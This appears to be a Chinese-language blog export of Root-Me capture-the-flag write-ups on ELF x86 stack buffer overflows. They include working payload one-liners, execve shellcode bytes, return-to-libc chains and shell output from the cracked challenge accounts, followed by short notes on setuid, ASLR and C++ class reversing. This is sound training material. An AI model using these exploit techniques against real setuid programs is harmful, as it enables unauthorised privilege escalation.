<h3 id="有符号数补码"><a href="#有符号数补码" class="headerlink" title="有符号数补码"></a>有符号数补码</h3><p>Because it’s a <code>signed int</code> variable, <code>0xffffffff equals to -1</code>.</p>
<p>《深入理解计算机系统》中<br>有符号数整数表示:<br>1011=<code>-1*2^3+0*2^2+1*2^1+1*2^0</code>=-5<br>1000=-8<br> 0111=7<br>1111=-1<br>所以<code>0xffffffff=-0x800000+0x7fffffff=-1</code></p>
<h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><p>简单逆向后，就知道多少能到EIP</p>
<p><code>(python -c &quot;print &#39;\xff&#39;*4+&#39;/&#39;+&#39;A&#39;*156+&#39;B&#39;*4)</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Stopped reason: SIGSEGV</span><br><span class="line"><span class="number">0x42424242</span> in ?? ()</span><br></pre></td></tr></table></figure>
<h3 id="gdb内外地址是不同的"><a href="#gdb内外地址是不同的" class="headerlink" title="gdb内外地址是不同的"></a>gdb内外地址是不同的</h3><p>shellcode 放在0xbffffa60<br>‘\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80’ 33长</p>
<p>(python -c “print ‘\xff’*4+’/‘+’A’*156+’0xbffffa60’[::-1]) &gt; /tmp/data.txt<br>但是还是段错误</p>
<p>It happens because the <code>addresses are different</code> between inside and outside of gdb (someone told me it’s because the additional environment variables gdb sets).</p>
<p>So to come around it, and find the actual address of the shellcode outside gdb, one can use the<code> -e switch of the strace tool</code>.<br>The -e switch enables one to set an expression which will affect the tool’s output. For example, for seeing the <code>second argument of read as an address instead of the string.</code></p>
<p><code>$strace -e raw=read ./ch11 /tmp/data.txt</code><br>重新设置shellcode地址</p>
<pre><code>app-systeme-ch11@challenge02:~$ ./ch11 /tmp/data.txt
[+] The pathname is : /j
                        X™Rfh-p‰áRjhh/bash/bin‰ãRQS‰á ̀

                  °úÿ¿

bash-4.4$ id
uid=1111(app-systeme-ch11) gid=1111(app-systeme-ch11) euid=1211(app-systeme-ch11
-cracked) groups=1111(app-systeme-ch11),100(users)</code></pre>
]]></content>
      <categories>
        <category>APP system in root_me</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>Stack buffer overflow basic 2</title>
    <url>/2020/11/14/Stack_buffer_overflow_basic_2/</url>
    <content><![CDATA[<h2 id="ELF-x86-Stack-buffer-overflow-basic-2"><a href="#ELF-x86-Stack-buffer-overflow-basic-2" class="headerlink" title="ELF x86 - Stack buffer overflow basic 2"></a>ELF x86 - Stack buffer overflow basic 2</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setreuid(geteuid(), geteuid());</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hey dude ! Waaaaazzaaaaaaaa ?!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> var;</span><br><span class="line">    <span class="keyword">void</span> (*func)()=sup;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    fgets(buf,<span class="number">133</span>,<span class="built_in">stdin</span>);</span><br><span class="line">    func();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<a id="more"></a> 
<h3 id="反汇编代码"><a href="#反汇编代码" class="headerlink" title="反汇编代码"></a>反汇编代码</h3><p><a href="https://imgchr.com/i/DCSycj"><img src="https://s3.ax1x.com/2020/11/14/DCSycj.jpg" alt="DCSycj.jpg"></a></p>
<p>获取输入后，调用eax寄存器中函数<br>输入存在<code>ebp-0x8c</code>, <code>ebp-0xc</code> 处保存着sup函数地址， 我们要做的就是将该地址换为shell()函数地址</p>
<h3 id="查看内存"><a href="#查看内存" class="headerlink" title="查看内存"></a>查看内存</h3><p><a href="https://imgchr.com/i/DCp9vd"><img src="https://s3.ax1x.com/2020/11/14/DCp9vd.jpg" alt="DCp9vd.jpg"></a></p>
<p>128字节后，即<code>0xbffffa9c（ebp-0xc)</code>处保存sup()函数地址<br>所以可以直接溢出</p>
<h3 id="替换为shell"><a href="#替换为shell" class="headerlink" title="替换为shell()"></a>替换为shell()</h3><p>查看shell()函数地址<br><a href="https://imgchr.com/i/DCpgRe"><img src="https://s3.ax1x.com/2020/11/14/DCpgRe.jpg" alt="DCpgRe.jpg"></a><br>为<code>0x08048516</code></p>
<h3 id="palyload"><a href="#palyload" class="headerlink" title="palyload"></a>palyload</h3><p><code>(python -c &#39;print &quot;a&quot;*128+&quot;08048516&quot;.decode(&quot;hex&quot;)[::-1]&#39;;cat) | ./ch15</code><br>“08048516”.decode(“hex”) 十六进制表示，所以用十六进制解码</p>
<pre><code>┌─[✗]─[zentreisender@parrotos]─[~/Documents/root_me/app_system]
└──╼ $python
Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
[GCC 9.3.0] on linux2
Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
&gt;&gt;&gt; &quot;08048516&quot;.decode(&quot;hex&quot;)
&#39;\x08\x04\x85\x16&#39;
&gt;&gt;&gt; &quot;08048516&quot;.encode(&quot;hex&quot;)
&#39;3038303438353136&#39;
&gt;&gt;&gt; </code></pre>
<p>注意python中的<code>&#39;</code> <code>&quot;</code><br><a href="https://imgchr.com/i/DC9Ay9"><img src="https://s3.ax1x.com/2020/11/14/DC9Ay9.jpg" alt="DC9Ay9.jpg"></a></p>
]]></content>
      <categories>
        <category>APP system in root_me</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>Stack buffer overflow basic 3</title>
    <url>/2020/12/11/Stack_buffer_overflow_basic_3/</url>
    <content><![CDATA[<h2 id="ELF-x86-Stack-buffer-overflow-basic-3"><a href="#ELF-x86-Stack-buffer-overflow-basic-3" class="headerlink" title="ELF x86 - Stack buffer overflow basic 3"></a>ELF x86 - Stack buffer overflow basic 3</h2><a id="more"></a>
<p>参考:: <a href="https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%203">https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%203</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">  <span class="keyword">int</span> check;</span><br><span class="line">  <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your name: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span>(count &gt;= <span class="number">64</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Oh no...Sorry !\n&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span>(check == <span class="number">0xbffffabc</span>)</span><br><span class="line">        shell();</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            read(fileno(<span class="built_in">stdin</span>),&amp;i,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">switch</span>(i)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;\n&#x27;</span>:</span><br><span class="line">                  <span class="built_in">printf</span>(<span class="string">&quot;\a&quot;</span>);</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x08</span>:</span><br><span class="line">                  count--;</span><br><span class="line">                  <span class="built_in">printf</span>(<span class="string">&quot;\b&quot;</span>);</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x04</span>:</span><br><span class="line">                  <span class="built_in">printf</span>(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                  count++;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x90</span>:</span><br><span class="line">                  <span class="built_in">printf</span>(<span class="string">&quot;\a&quot;</span>);</span><br><span class="line">                  count++;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                  buffer[count] = i;</span><br><span class="line">                  count++;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setreuid(geteuid(), geteuid());</span><br><span class="line">  system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>0x0804866a &lt;+116&gt;:   cmp    DWORD PTR [ebp-0x50],0xbffffabc</code></p>
<p>如果<code>  buffer[count]</code> 指向 check的地址， 那么<code>buffer[count] = i</code>就可以把输入值赋给check<br>将count减为-4，buffer[-4]就相当于buffer地址减去4</p>
<pre><code>app-systeme-ch16@challenge02:~$ (python -c &#39;print &quot;\x08&quot;*4+&quot;\xbc\xfa\xff\xbf&quot;&#39;;cat )| ./ch16
Enter your name: id
uid=1216(app-systeme-ch16-cracked) gid=1116(app-systeme-ch16) groups=1116(app-systeme-ch16),100(users)
cat .passwd</code></pre>
]]></content>
      <categories>
        <category>APP system in root_me</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>Stack buffer overflow basic 5</title>
    <url>/2021/01/08/Stack_buffer_overflow_basic_5/</url>
    <content><![CDATA[<p>ELF x86 - Stack buffer overflow basic 5</p>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(fgets(buff, BUFFER, file) != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    chomp(buff);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strncmp</span>(buff, <span class="string">&quot;USERNAME=&quot;</span>, <span class="number">9</span>) == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        cpstr(init.username, buff+<span class="number">9</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">fclose(file);</span><br><span class="line"><span class="keyword">return</span> init;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>数据读入buffer，<code>ebp-0x2a5</code>， 只能读512字符+’\n’。不能到EIP，但这段代码赋值到init，没有检查边界，init起始地址<code>ebp-0xa4 </code>，比较小好溢出。</p>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>函数最后，会将本地变量init赋值到外部init所在地址，位于<code>$ebp+0x8</code>，值为<code>0xbffffb00</code>，因为buff最后’\n’变为’\00’，为了能够执行，shellcode最后还要加上<code>$ebp+0x8</code>，此时刚好有个’00’，所以不用加地址也能运行，但最后还是段错误。<br><a href="https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%205">https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%205</a><br>最后用到这篇的方法：<br><a href="https://finsenty54.github.io/2020/12/29/stack_buffer_overflow_basic_4/">https://finsenty54.github.io/2020/12/29/stack_buffer_overflow_basic_4/</a></p>
<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><ol>
<li><code>wget https://raw.githubusercontent.com/Finsenty54/-python/master/findenv.c</code></li>
<li><code>gcc -o findenv findenv.c</code></li>
<li><code>export JUNK=(python -c &quot;print &#39;B&#39; * 1000&quot;)</code></li>
<li><code>export SHELCODE=(python -c &#39;print(&quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80&quot;)&#39;)</code></li>
<li><code>/tmp/findenv JUNK ./ch10</code><br>JUNK will be at 0xbffffac2</li>
<li><code>/tmp/findenv SHELCODE ./ch10</code><br>SHELCODE will be at 0xbfffff4d</li>
<li><code>(python -c &quot;print &#39;USERNAME=&#39;+&#39;\x90&#39;*136+&#39;\x60\xb1\x04\x08&#39;+&#39;A&#39;*28+&#39;\x4d\xff\xff\xbf&#39;+&#39;\xc2\xfa\xff\xbf&#39;&quot;) &gt; /var/tmp/data.txt</code></li>
</ol>
<pre><code>app-systeme-ch10@challenge02:~$ ./ch10 /var/tmp/data.txt
bash-4.4$ id
uid=1110(app-systeme-ch10) gid=1110(app-systeme-ch10) euid=1210(app-systeme-ch10-cracked) groups=1110(app-systeme-ch10),100(users)
bash-4.4$ cat .passwd</code></pre>
]]></content>
      <categories>
        <category>APP system in root_me</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>ELF x86 - Stack buffer overflow basic 6</title>
    <url>/2020/12/31/Stack_buffer_overflow_basic_6/</url>
    <content><![CDATA[<h1 id="ELF-x86-Stack-buffer-overflow-basic-6"><a href="#ELF-x86-Stack-buffer-overflow-basic-6" class="headerlink" title="ELF x86 - Stack buffer overflow basic 6"></a>ELF x86 - Stack buffer overflow basic 6</h1><p><code>return to libc</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> ** argv)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> message[<span class="number">20</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span> (<span class="string">&quot;Usage: %s &lt;message&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    setreuid(geteuid(), geteuid());</span><br><span class="line">    <span class="built_in">strcpy</span> (message, argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span> (<span class="string">&quot;Your message: %s\n&quot;</span>, message);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="知识学习"><a href="#知识学习" class="headerlink" title="知识学习"></a>知识学习</h2><h3 id="setuid-amp-setgid"><a href="#setuid-amp-setgid" class="headerlink" title="setuid &amp; setgid"></a>setuid &amp; setgid</h3><p>When the** setuid or setgid <strong>attributes are set on an executable file, then any users able to **execute the file will automatically execute the file with the privileges of the file’s owner (commonly root)</strong> and/or the file’s group, depending upon the flags set<br>普通用户提升权限运行<br>The setuid and setgid bits are normally set with the command chmod by setting the high-<strong>order octal digit to 4 for setuid or 2 for setgid</strong>. “chmod 6711 file” will set both the setuid and setgid bits (4+2=6), making the file read/write/executable for the owner (7), and executable by the group (first 1) and others (second 1). When a user other than the owner executes the file,** the process will run with user and group permissions set upon it by its owner**. For example, if the file is owned by user root and group wheel, it will run as root:wheel no matter who executes the file.<br><code>chmod +s</code></p>
<h3 id="防御-降权-seteuid"><a href="#防御-降权-seteuid" class="headerlink" title="防御-降权 seteuid()"></a>防御-降权 seteuid()</h3><p>Normal approach followed by root setuid programs is to drop root privileges before getting input from the user. Thus even when user input is malicious, attacker wont get a root shell.<br>root setuid接收用户输入后，丢弃root权限<br>For** example below vulnerable code **wont allow the attacker to get a root shell.</p>
<pre><code> seteuid(getuid()); /* Temporarily drop privileges */ </code></pre>
<h3 id="sticky-bit"><a href="#sticky-bit" class="headerlink" title="sticky bit"></a>sticky bit</h3><p>When a directory’s sticky bit is set, the filesystem treats the files in such directories in a special way <strong>so only the file’s owner,</strong> the directory’s owner, or root user can rename or delete the file. </p>
<pre><code>ls -l test
chmod +t test; ls -l test</code></pre>
<h3 id="setreuid"><a href="#setreuid" class="headerlink" title="setreuid()"></a>setreuid()</h3><p><code>setreuid(geteuid(), geteuid());</code> 这是提升权限<br>每个Linux进程都有有两个相关的用户ID：实际用户ID（即ruid）和有效用户ID（即euid），其中ruid表示了该进程由谁运行，即当前系统环境用户是谁，主要回答who am I?的问题；而euid则用来规范进程的实际权限控制。比如passwd文件存放了用户名和密码，当一个普通用户运行passwd时，其ruid是自己，而euid则临时变为了文件的所有者root。<br>setreuid的作用在于设置ruid和euid</p>
<h3 id="geteuid"><a href="#geteuid" class="headerlink" title="geteuid()"></a>geteuid()</h3><p>geteuid()用来取得执行目前进程有效的用户识别码. 有效的用户识别码用来<strong>决定进程执行的权限,</strong> 借由此改变此值, 进程可以<strong>获得额外的权限</strong>. 倘若执行文件的setID 位已被设置, 该文件执行时, 其进程的euid值便会设成该文件所有者的uid. 例如, 执行文件/usr/bin/passwd 的权限为-r-s–x–x, 其s 位即为setID(SUID)位, 而当任何用户在执行passwd 时其有效的用户识别码会被设成passwd 所有者的uid 值, <strong>即root 的uid 值(0)</strong>.</p>
<pre><code>app-systeme-ch13@challenge02:~$ ls -l ./ch13
-r-sr-x--- 1 app-systeme-ch13-cracked app-systeme-ch13 7360 May 19  2019 ./ch13</code></pre>
<h3 id="关闭ASLR-原来值是2"><a href="#关闭ASLR-原来值是2" class="headerlink" title="关闭ASLR 原来值是2"></a>关闭ASLR 原来值是2</h3><p>使用<code>sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</code>即可关闭ASLR</p>
<hr>
<h2 id="ret2lic入门"><a href="#ret2lic入门" class="headerlink" title="ret2lic入门"></a>ret2lic入门</h2><p><a href="https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-return-to-libc/">https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-return-to-libc/</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"> <span class="comment">//vuln.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>]; <span class="comment">/* [1] */</span> </span><br><span class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]); <span class="comment">/* [2] */</span></span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf); <span class="comment">/* [3] */</span></span><br><span class="line"> fflush(<span class="built_in">stdout</span>);  <span class="comment">/* [4] */</span></span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>r $(python2 -c &quot;print &#39;A&#39;*270&quot;)</code><br>溢出 64位下<br><code>Invalid $PC address: 0x414141414141</code></p>
<hr>
<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>逆向</p>
<pre><code>gdb-peda$ r $(python -c &quot;print &#39;a&#39;*36&quot;)
Stopped reason: SIGSEGV
0x61616161 in ?? ()</code></pre>
<p>查看</p>
<pre><code>gdb-peda$ print system
$2 = &#123;&lt;text variable, no debug info&gt;&#125; 0xb7e68310 &lt;system&gt;

gdb-peda$ print exit
$3 = &#123;&lt;text variable, no debug info&gt;&#125; 0xb7e5b260 &lt;exit&gt;

x/4000s $rsp
0xbffffef8:     &quot;SHELL=/bin/bash&quot;

gdb-peda$ x/s 0xbffffef8+6
0xbffffefe:     &quot;/bin/bash&quot;、x</code></pre>
<p>将这三项连接在一起<br><code>r $(python -c &quot;print &#39;a&#39;*32+&#39;\x10\x83\xe6\xb7&#39;+&#39;\x60\xb2\xe5\xb7&#39;+&#39;\xfe\xfe\xff\xbf&#39;&quot;) </code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">Your message: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaƒæ·`²å·þþÿ¿</span><br><span class="line">[New process <span class="number">5677</span>]</span><br><span class="line">process <span class="number">5677</span> is executing <span class="keyword">new</span> program: /bin/dash</span><br><span class="line">Error in re-setting breakpoint <span class="number">1</span>: Function <span class="string">&quot;main&quot;</span> <span class="keyword">not</span> defined.</span><br><span class="line">Warning:</span><br><span class="line">Cannot insert breakpoint <span class="number">2.</span></span><br><span class="line">Cannot access memory at address </span><br></pre></td></tr></table></figure>
<p>报错不成功</p>
<p><code>(gdb) info proc map</code><br>查看虚拟空间布局</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Start Addr   End Addr       Size     Offset objfile</span><br><span class="line"> 0x8048000  0x8049000     0x1000        0x0 /challenge/app-systeme/ch33/ch33</span><br><span class="line"> 0x8049000  0x804a000     0x1000        0x0 /challenge/app-systeme/ch33/ch33</span><br><span class="line"> 0x804a000  0x804b000     0x1000     0x1000 /challenge/app-systeme/ch33/ch33</span><br><span class="line">0xb7e27000 0xb7e28000     0x1000        0x0</span><br><span class="line">0xb7e28000 0xb7fd3000   0x1ab000        0x0 /libold/i386-linux-gnu/libc.so.6</span><br><span class="line">0xb7fd3000 0xb7fd5000     0x2000   0x1aa000 /libold/i386-linux-gnu/libc.so.6</span><br><span class="line">0xb7fd5000 0xb7fd6000     0x1000   0x1ac000 /libold/i386-linux-gnu/libc.so.6</span><br><span class="line">0xb7fd6000 0xb7fda000     0x4000        0x0</span><br><span class="line">0xb7fda000 0xb7fdd000     0x3000        0x0 [vvar]</span><br><span class="line">0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]</span><br><span class="line">0xb7fde000 0xb7ffe000    0x20000        0x0 /libold/i386-linux-gnu/ld-2.19.so</span><br><span class="line">0xb7ffe000 0xb7fff000     0x1000    0x1f000 /libold/i386-linux-gnu/ld-2.19.so</span><br><span class="line">0xb7fff000 0xb8000000     0x1000    0x20000 /libold/i386-linux-gnu/ld-2.19.so</span><br><span class="line">0xbffdf000 0xc0000000    0x21000        0x0 [stack]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>查找”/bin/sh”在libc中的位置</p>
<pre><code>gdb-peda$ searchmem &quot;/bin/sh&quot; 0xb7e27000 0xb7fd6000
Searching for &#39;/bin/sh&#39; in range: 0xb7e27000 - 0xb7fd6000
Found 1 results, display max 1 items:
libc.so.6 : 0xb7f8ad4c (&quot;/bin/sh&quot;)</code></pre>
<p>或者<br><code>gdb-peda$ find &quot;/bin/sh&quot;</code></p>
<p>成功，中间exit()不用连接也可以<br>for exiting without segmentation fault, it’s necessary to replace the ‘DDDD’ with a valid address (e.g address to libc’s exit function).<br>需要退出没有段报错，将DDDD用exit替换</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">app-systeme-ch33@challenge02:~$ ./ch33 $(python -c <span class="string">&quot;print &#x27;a&#x27;*32+&#x27;\x10\x83\xe6\xb7&#x27;+&#x27;AAAA&#x27;+&#x27;\x4c\xad\xf8\xb7&#x27;&quot;</span>)</span><br><span class="line">Your message: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaƒæ·AAAAL­ø·</span><br><span class="line">$ id</span><br><span class="line">uid=1233(app-systeme-ch33-cracked) gid=1133(app-systeme-ch33) groups=1133(app-systeme-ch33),100(users)</span><br><span class="line">$ cat .passwd</span><br></pre></td></tr></table></figure>


<p><code>/bin/sh</code> used to point to<code>/bin/bash</code>on most GNU/Linux systems.</p>
<hr>
<p>查看布局的另一种方法<br><code>maintenance info sections ALLOBJ</code><br>Object file: /lib/x86_64-linux-gnu/libc.so.6<br> [0]      0x7ffff7de42e0-&gt;0x7ffff7de4304 at 0x000002e0: .note.gnu.build-id ALLOC LOAD READONLY DATA HAS_CONTENTS<br> [1]      0x7ffff7de4304-&gt;0x7ffff7de4324 at 0x00000304: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS<br> [2]      0x7ffff7de4328-&gt;0x7ffff7de781c at 0x00000328: .hash ALLOC LOAD READONLY DATA HAS_CONTENTS<br> [3]      0x7ffff7de7820-&gt;0x7ffff7deb4d4 at 0x00003820: .gnu.hash ALLOC LOAD READONLY DATA HAS_CONTENTS<br> [4]      0x7ffff7deb4d8-&gt;0x7ffff7df9308 at 0x000074d8: .dynsym ALLOC LOAD READONLY DATA HAS_CONTENTS<br> [5]      0x7ffff7df9308-&gt;0x7ffff7dff3c9 at 0x00015308: .dynstr ALLOC LOAD READONLY DATA HAS_CONTENTS</p>
]]></content>
      <categories>
        <category>APP system in root_me</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>bug</title>
    <url>/2019/11/20/bug/</url>
    <content><![CDATA[<ol>
<li>修复了发布时间超前的问题</li>
</ol>
<p>–在配置文件中将时区修改为<code>Asia/Shanghai</code><br><del>2019-11-20 20:28:32 星期三</del></p>
<a id="more"></a>
]]></content>
      <tags>
        <tag>bug</tag>
      </tags>
  </entry>
  <entry>
    <title>ch25.bin</title>
    <url>/2020/10/05/ch25bin/</url>
    <content><![CDATA[<h2 id="逆向-root-me"><a href="#逆向-root-me" class="headerlink" title="逆向 root_me"></a>逆向 root_me</h2><h3 id="ch25-bin"><a href="#ch25-bin" class="headerlink" title="ch25.bin"></a>ch25.bin</h3><p><a href="https://www.root-me.org/en/Challenges/Cracking/ELF-C-0-protection?lang=en">https://www.root-me.org/en/Challenges/Cracking/ELF-C-0-protection?lang=en</a></p>
<a id="more"></a>
<h4 id="识别C-类"><a href="#识别C-类" class="headerlink" title="识别C++类"></a>识别C++类</h4><p>如何识别软件是用C++所写？<br>1 频繁使用ECX 保存this 指针 ，指向类对象，如在调用函数前<br>2 虚函数 要先知道类虚函数表，然后得到实际值，也是传到ECX中<br>3 使用STL code 可用IDA imports查看</p>
<h4 id="类怎么在内存中存储"><a href="#类怎么在内存中存储" class="headerlink" title="类怎么在内存中存储"></a>类怎么在内存中存储</h4><p>每个变量四字节<br>不足要对齐<br>内存中排列与定义相同</p>
<hr>
<p>虚函数表要在最开头<br>表包含虚函数地址，按定义排序</p>
<p><strong>如果继承另一个类</strong></p>
<p>继承多个类<br><strong>虚表按顺序排序</strong></p>
<hr>
<h4 id="识别类"><a href="#识别类" class="headerlink" title="识别类"></a>识别类</h4><h5 id="1-识别构建和撤销"><a href="#1-识别构建和撤销" class="headerlink" title="1 识别构建和撤销"></a>1 识别构建和撤销</h5><h6 id="1-1-全局变量"><a href="#1-1-全局变量" class="headerlink" title="1.1 全局变量"></a>1.1 全局变量</h6><p>在编译时 保存到（PE）文件的数据段<br>构建在main()前调用</p>
